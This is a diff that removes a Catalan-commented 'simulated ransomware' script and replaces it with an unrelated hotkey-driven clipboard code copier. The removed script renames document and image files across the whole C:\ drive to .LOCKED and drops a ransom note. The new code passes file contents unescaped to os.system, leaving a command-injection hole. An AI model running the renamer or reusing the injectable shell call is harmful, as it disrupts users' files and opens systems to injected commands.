@@ -1,22 +1,36 @@
+import keyboard
 import os
-from pathlib import Path
 
-# Directori de prova a xifrar (creat prèviament)
-target_dir = Path("C:\\")
+# Try to import pyperclip, otherwise use fallback
+try:
+    import pyperclip
+    def copy_to_clipboard(text):
+        pyperclip.copy(text)
+except ImportError:
+    def copy_to_clipboard(text):
+        # Windows fallback using built-in "clip"
+        os.system(f'echo {text.strip()}| clip')
 
-# Llista d'extensions a "xifrar" (canviar l'extensió)
-target_exts = ['.txt', '.docx', '.jpg']
+# Load codes from file
+with open("codes.txt", "r", encoding="utf-8") as f:
+    codes = [line.strip() for line in f if line.strip()]
 
-# "Xifrat" simulat: simplement canvia l'extensió dels arxius a .LOCKED
-for file_path in target_dir.rglob('*'):
-    if file_path.suffix in target_exts:
-        new_name = file_path.with_suffix('.LOCKED')
-        os.rename(file_path, new_name)
-        print(f"[+] Arxiu 'xifrat': {file_path.name} -> {new_name.name}")
+index = 0
 
-# Deixa un "rescatt" simulat
-ransom_note = target_dir / "LEGGIMI.txt"
-ransom_note.write_text("""[SIMULACIÓ] Els teus arxius han estat xifrats.
-Aquest és un exercici acadèmic de ciberseguretat.
-No es requereix cap pagament.""")
-print("[+] Atac simulat completat. Fitxer de rescat creat.")
+def copy_next_code():
+    global index
+    if index < len(codes):
+        code = codes[index]
+        copy_to_clipboard(code)
+        print(f"[{index+1}/{len(codes)}] Copied: {code}")
+        index += 1
+    else:
+        print("✅ All codes used. Restart program to reuse.")
+        keyboard.unhook_all_hotkeys()
+
+# Bind hotkey "K"
+keyboard.add_hotkey("k", copy_next_code)
+
+print("Press 'K' to copy the next code to clipboard.")
+print(f"Loaded {len(codes)} codes from codes.txt")
+keyboard.wait()
